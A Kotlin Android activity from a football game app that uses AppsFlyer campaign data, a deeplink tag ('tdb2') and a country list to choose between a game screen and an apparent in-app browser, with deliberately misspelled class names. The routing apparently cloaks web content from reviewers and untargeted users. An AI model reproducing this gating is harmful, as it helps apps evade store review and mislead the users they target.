package com.gamegou.footbally

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.gamegou.footbally.ApppliacttionClass.Companion.C1
import com.gamegou.footbally.ApppliacttionClass.Companion.DEEPL
import com.gamegou.footbally.ApppliacttionClass.Companion.appsCheck
import com.gamegou.footbally.ApppliacttionClass.Companion.countryCode
import com.gamegou.footbally.ApppliacttionClass.Companion.geo
import com.gamegou.footbally.databinding.ActivityAsfActtttttttAcctBinding
import com.orhanobut.hawk.Hawk
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class AsfActtttttttAcct : AppCompatActivity() {
    lateinit var bindAsf: ActivityAsfActtttttttAcctBinding
    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)

        bindAsf = ActivityAsfActtttttttAcctBinding.inflate(layoutInflater)
        setContentView(bindAsf.root)

        val appsCh: String? = Hawk.get(appsCheck, "null")

        if (appsCh == "1") {
            AppsFlyerLib.getInstance()
                .init("BrT5KSpPeaEcduDRgNFHgj", conversionDataListener, applicationContext)
            AppsFlyerLib.getInstance().start(this)
        }

        folk()

    }

    private val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1, dataGotten)
        }
        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }


    private fun folk() {

        val countriesPool: String = Hawk.get(geo)
        val countyC: String = Hawk.get(countryCode, "null")

        val deeplink: String? = Hawk.get(DEEPL, "null") //здесь нужен дефолтный ноль
        val appsCh: String? = Hawk.get(appsCheck, "null")
        var naming: String? = Hawk.get(C1)

        if (appsCh == "1") {
            val d = Log.d("AppsChecker", appsCh)
            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (naming != null) {

                    if (naming!!.contains("tdb2") || countriesPool.contains(countyC) || deeplink!!.contains("tdb2")) {
                        Log.d("Apps Checker", "naming: $naming")
                        executorService.shutdown()
                        intWE()
                    } else {
                        executorService.shutdown()
                        intLONE()
                    }
                } else {
                    naming = Hawk.get(C1)
                    Log.d("TestInUIHawk", "Received null $naming")
                }
            }, 0, 1, TimeUnit.SECONDS)
        }  else if (countriesPool.contains(countyC)) {
            intWE()
        } else {
            intLONE()
        }

    }

    private fun intLONE() {
        val intent = Intent(this@AsfActtttttttAcct, GaaaameeeHooldeerActivity::class.java)
        Hawk.put(geo, null)
        Hawk.put(countryCode, null)
        startActivity(intent)
        finish()
    }

    private fun intWE() {
        val intent = Intent(this@AsfActtttttttAcct, BrovvvssserActivity::class.java)
        Hawk.put(geo, null)
        Hawk.put(countryCode, null)
        startActivity(intent)
        finish()
    }
}